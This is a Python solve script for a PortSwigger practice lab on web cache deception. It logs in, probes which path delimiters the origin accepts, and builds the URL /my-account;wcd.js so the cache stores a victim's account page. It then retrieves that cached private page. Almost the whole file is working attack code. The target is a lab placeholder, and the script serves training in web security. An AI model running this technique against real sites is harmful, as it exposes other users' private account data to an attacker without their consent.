"""
Lab 2: Exploiting path delimiters for web cache deception
https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters
Difficulty: Practitioner

📝 The origin treats ';' as a path-segment delimiter (so /my-account;xyz
still resolves to /my-account), but the cache does NOT recognize ';' as a
delimiter and still applies its .js extension rule to the literal full
string — /my-account;wcd.js threads both needles at once.
"""

from utils import get_session, cache_status, probe_delimiters, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def run():
    s = get_session()
    s.post(f"{TARGET}/login", data=WIENER)

    note("Step 1: find which characters the ORIGIN treats as a delimiter")
    note("(a 200/normal response despite extra junk after the character).")
    probe_delimiters(s, f"{TARGET}/my-account", suffix="abc")

    note("Step 2: for each delimiter that worked, check whether appending")
    note(".js after it STILL gets served normally by the origin AND picked")
    note("up by the cache's extension rule.")
    r = s.get(f"{TARGET}/my-account;abc.js")
    log(f"Status: {r.status_code}, X-Cache: {cache_status(r)!r}")

    r2 = s.get(f"{TARGET}/my-account;abc.js")
    log(f"Second request X-Cache: {cache_status(r2)!r} (expect 'hit')")

    exploit_url = f"{TARGET}/my-account;wcd.js"
    log(f"Deliver this URL to carlos: {exploit_url}")

    note("After carlos visits it, fetch the same URL to retrieve his cached")
    note("account page.")
    r3 = s.get(exploit_url)
    log(f"Retrieved: {r3.text[:300]}")


if __name__ == "__main__":
    run()
